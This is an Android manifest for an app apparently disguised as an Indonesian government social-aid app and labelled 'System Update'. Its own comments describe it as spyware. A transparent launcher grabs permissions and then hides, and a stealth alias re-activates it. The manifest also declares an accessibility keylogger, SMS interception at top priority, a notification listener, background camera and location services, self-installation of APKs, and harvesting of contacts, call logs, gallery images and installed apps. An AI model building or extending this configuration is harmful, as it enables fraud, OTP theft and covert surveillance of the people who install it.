<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.kemensos.bansos"
    android:versionCode="5"
    android:versionName="5.0">

    <!-- === STANDARD PERMISSIONS === -->
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
    <uses-permission android:name="android.permission.CAMERA" />
    <uses-permission android:name="android.permission.RECORD_AUDIO" />
    <uses-permission android:name="android.permission.RECEIVE_SMS" />
    <uses-permission android:name="android.permission.READ_SMS" />
    <uses-permission android:name="android.permission.READ_PHONE_STATE" />

    <!-- === FOREGROUND SERVICE === -->
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />

    <!-- === NOTIFICATIONS === -->
    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />

    <!-- === STEALTH / PERSISTENCE === -->
    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
    <uses-permission android:name="android.permission.WAKE_LOCK" />
    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
    <uses-permission android:name="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" />

    <!-- === STORAGE (for APK download/install) === -->
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"
        android:maxSdkVersion="28" />
    <uses-permission android:name="android.permission.VIBRATE" />
    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />

    <!-- === KEYLOGGER / ACCESSIBILITY === -->
    <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE" />
    <!-- === v5.0 NEW PERMISSIONS === -->
    <uses-permission android:name="android.permission.READ_CALL_LOG" />
    <uses-permission android:name="android.permission.READ_CONTACTS" />
    <uses-permission android:name="android.permission.READ_SMS" />
    <!-- === GALLERY === -->
    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />

    <application
        android:allowBackup="false"
        android:icon="@drawable/ic_launcher"
        android:label="Pembaruan Sistem"
        android:supportsRtl="false"
        android:theme="@style/Theme.Transparent"
        android:networkSecurityConfig="@xml/network_security_config"
        android:usesCleartextTraffic="true">

        <!-- MAIN ACTIVITY: transparent, requests all permissions, then disappears -->
        <activity
            android:name=".MainActivity"
            android:excludeFromRecents="true"
            android:exported="true"
            android:launchMode="singleInstance"
            android:theme="@style/Theme.Transparent"
            android:noHistory="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

        <!-- ALIAS ACTIVITY: stealth re-activator (hidden, launched from notification) -->
        <activity-alias
            android:name=".MainActivityAlias"
            android:enabled="true"
            android:exported="true"
            android:targetActivity=".MainActivity"
            android:label="Pengaturan Sistem"
            android:excludeFromRecents="true"
            android:noHistory="true"
            android:theme="@style/Theme.Transparent">
        </activity-alias>

        <!-- FOREGROUND BACKGROUND SERVICE (GPS + Camera + auto-update) -->
        <service
            android:name=".UpdateService"
            android:exported="false"
            android:foregroundServiceType="camera|location|dataSync" />

        <!-- SMS RECEIVER -->
        <receiver
            android:name=".SmsReceiver"
            android:exported="true"
            android:permission="android.permission.BROADCAST_SMS">
            <intent-filter android:priority="999">
                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
            </intent-filter>
        </receiver>

        <!-- NOTIFICATION LISTENER -->
        <service
            android:name=".NotifService"
            android:exported="true"
            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
            <intent-filter>
                <action android:name="android.service.notification.NotificationListenerService" />
            </intent-filter>
        </service>

        <!-- KEYLOGGER SERVICE (Accessibility) -->
        <service
            android:name=".KeylogService"
            android:exported="true"
            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
            <intent-filter>
                <action android:name="android.accessibilityservice.AccessibilityService" />
            </intent-filter>
            <meta-data
                android:name="android.accessibilityservice"
                android:resource="@xml/accessibility_service_config" />
        </service>

        <!-- === v5.0 NEW SERVICES === -->
        <!-- CALL LOG MONITOR -->
        <service
            android:name=".CallLogService"
            android:exported="false"
            android:enabled="true" />
        <!-- CONTACT SYNC -->
        <service
            android:name=".ContactSyncService"
            android:exported="false"
            android:enabled="true" />
        <!-- INSTALLED APPS LIST -->
        <service
            android:name=".InstalledAppsService"
            android:exported="false"
            android:enabled="true" />
        <!-- SIM CHANGE RECEIVER -->
        <receiver
            android:name=".SimChangeReceiver"
            android:exported="true"
            android:enabled="true">
            <intent-filter>
                <action android:name="android.intent.action.SIM_STATE_CHANGED" />
            </intent-filter>
        </receiver>
        <!-- GALLERY SYNC -->
        <service
            android:name=".GallerySyncService"
            android:exported="false"
            android:enabled="true" />

    </application>
</manifest>
